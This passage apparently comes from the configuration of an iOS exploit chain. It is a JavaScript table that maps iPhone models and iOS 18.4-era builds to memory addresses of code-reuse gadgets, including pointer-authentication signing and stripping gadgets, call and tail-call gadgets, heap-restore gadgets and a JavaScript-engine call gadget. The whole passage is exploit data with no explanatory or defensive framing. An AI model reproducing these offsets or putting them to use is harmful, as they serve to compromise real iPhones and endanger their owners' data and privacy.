      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff38970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone17,1_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda5f24n,
      tcall_RLG: 0x20db52218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261ee098cn,
      fcall_14_args_write_x8: 0x24c76cf7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff38970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone17,2_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda5f24n,
      tcall_RLG: 0x20db52218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261ee098cn,
      fcall_14_args_write_x8: 0x24c76cf7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff38970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone17,3_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb0d2ecn,
      tcall_X0LG: 0x21eda1f24n,
      tcall_RLG: 0x20db4e218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261b3198cn,
      fcall_14_args_write_x8: 0x24c768f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aafd4n,
      transformSurface_gadget: 0x20ff34970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone17,4_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb0d2ecn,
      tcall_X0LG: 0x21eda1f24n,
      tcall_RLG: 0x20db4e218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261b3198cn,
      fcall_14_args_write_x8: 0x24c768f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aafd4n,
      transformSurface_gadget: 0x20ff34970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone17,5_22E240": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb052ecn,
      tcall_X0LG: 0x21ed99f24n,
      tcall_RLG: 0x20db46218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x26189b98cn,
      fcall_14_args_write_x8: 0x24c760f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7a2fd4n,
      transformSurface_gadget: 0x20ff2c970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone11,2_4_6_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ecf72ecn,
      tcall_X0LG: 0x21ed72f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x260f0198cn,
      fcall_14_args_write_x8: 0x24c44cf7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a994fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone11,8_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ecbf2ecn,
      tcall_X0LG: 0x21ed6ef24n,
      tcall_RLG: 0x20db2e218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x260ef098cn,
      fcall_14_args_write_x8: 0x24c414f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a95cfd4n,
      transformSurface_gadget: 0x20ff14970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone12,1_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ecc32ecn,
      tcall_X0LG: 0x21ed72f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x260fe298cn,
      fcall_14_args_write_x8: 0x24c460f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a960fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone12,3_5_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ecc32ecn,
      tcall_X0LG: 0x21ed72f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x260fe298cn,
      fcall_14_args_write_x8: 0x24c460f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a960fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone12,8_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ebdb2ecn,
      tcall_X0LG: 0x21ed6ef24n,
      tcall_RLG: 0x20db2e218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x260f2198cn,
      fcall_14_args_write_x8: 0x24c370f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a878fd4n,
      transformSurface_gadget: 0x20ff14970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone13,1_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23eae52ecn,
      tcall_X0LG: 0x21ed85f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x26127d98cn,
      fcall_14_args_write_x8: 0x24c633f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a782fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone13,2_3_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23eae92ecn,
      tcall_X0LG: 0x21ed89f24n,
      tcall_RLG: 0x20db36218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x26161e98cn,
      fcall_14_args_write_x8: 0x24c637f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a786fd4n,
      transformSurface_gadget: 0x20ff1c970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone13,4_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23eae92ecn,
      tcall_X0LG: 0x21ed89f24n,
      tcall_RLG: 0x20db36218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x26161e98cn,
      fcall_14_args_write_x8: 0x24c637f7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a786fd4n,
      transformSurface_gadget: 0x20ff1c970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone14,2_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eabd2ecn,
      tcall_X0LG: 0x21ed8df24n,
      tcall_RLG: 0x20db3a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x2619ec98cn,
      fcall_14_args_write_x8: 0x24c683f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a75afd4n,
      transformSurface_gadget: 0x20ff20970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone14,3_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eabd2ecn,
      tcall_X0LG: 0x21ed8df24n,
      tcall_RLG: 0x20db3a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x2619ec98cn,
      fcall_14_args_write_x8: 0x24c683f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a75afd4n,
      transformSurface_gadget: 0x20ff20970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone14,4_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23eab52ecn,
      tcall_X0LG: 0x21ed85f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x26164398cn,
      fcall_14_args_write_x8: 0x24c67bf7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a752fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone14,5_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23eab52ecn,
      tcall_X0LG: 0x21ed85f24n,
      tcall_RLG: 0x20db32218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x26164398cn,
      fcall_14_args_write_x8: 0x24c67bf7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a752fd4n,
      transformSurface_gadget: 0x20ff18970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone14,6_22E252": {
      malloc_restore_2_gadget: 0x1a96445d0n,
      dyld_signPointer_gadget: 0x1a963c1e0n,
      malloc_restore_0_gadget: 0x18fd9228cn,
      malloc_restore_1_gadget: 0x1ca4985c8n,
      malloc_restore_3_gadget: 0x19031ecd4n,
      self_loop: 0x1900e0d9cn,
      tcall_CRLG: 0x23ea312ecn,
      tcall_X0LG: 0x21ed89f24n,
      tcall_RLG: 0x20db36218n,
      tcall_CSSG: 0x1ad44dbbcn,
      tcall_DSSG: 0x1a9ba7c24n,
      tcall_DG: 0x1dffe5ff4n,
      _CFObjectCopyProperty: 0x18e5a54d8n,
      load_x1x3x8: 0x2615f298cn,
      fcall_14_args_write_x8: 0x24c5eff7cn,
      _4_fcalls: 0x1c620bbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8c995cn,
      jsvm_isNAN_fcall_gadget2: 0x1803ae524n,
      store_x0_x0: 0x194328068n,
      mov_x0_x22: 0x19412b870n,
      str_x1_x2: 0x1e6664b50n,
      add_x22_0x90: 0x23a6cefd4n,
      transformSurface_gadget: 0x20ff1c970n,
      xpac_gadget: 0x1b63d615cn
   },
   "iPhone14,7_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eacd2ecn,
      tcall_X0LG: 0x21ed9df24n,
      tcall_RLG: 0x20db4a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261a0398cn,
      fcall_14_args_write_x8: 0x24c693f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a76afd4n,
      transformSurface_gadget: 0x20ff30970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone14,8_22E252": {
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eacd2ecn,
      tcall_X0LG: 0x21ed9df24n,
      tcall_RLG: 0x20db4a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261a0398cn,
      fcall_14_args_write_x8: 0x24c693f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a76afd4n,
      transformSurface_gadget: 0x20ff30970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone15,2_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb0d2ecn,
      tcall_X0LG: 0x21ed9df24n,
      tcall_RLG: 0x20db4a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261df898cn,
      fcall_14_args_write_x8: 0x24c6d4f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aafd4n,
      transformSurface_gadget: 0x20ff30970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone15,3_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb0d2ecn,
      tcall_X0LG: 0x21ed9df24n,
      tcall_RLG: 0x20db4a218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261df898cn,
      fcall_14_args_write_x8: 0x24c6d4f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aafd4n,
      transformSurface_gadget: 0x20ff30970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone15,4_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda1f24n,
      tcall_RLG: 0x20db4e218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261a9d98cn,
      fcall_14_args_write_x8: 0x24c6d8f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff34970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone15,5_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda1f24n,
      tcall_RLG: 0x20db4e218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261a9d98cn,
      fcall_14_args_write_x8: 0x24c6d8f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff34970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone16,1_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda5f24n,
      tcall_RLG: 0x20db52218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x2625fc98cn,
      fcall_14_args_write_x8: 0x24ce88f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff38970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone16,2_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda5f24n,
      tcall_RLG: 0x20db52218n,
      tcall_CSSG: 0x1ad451bbcn,
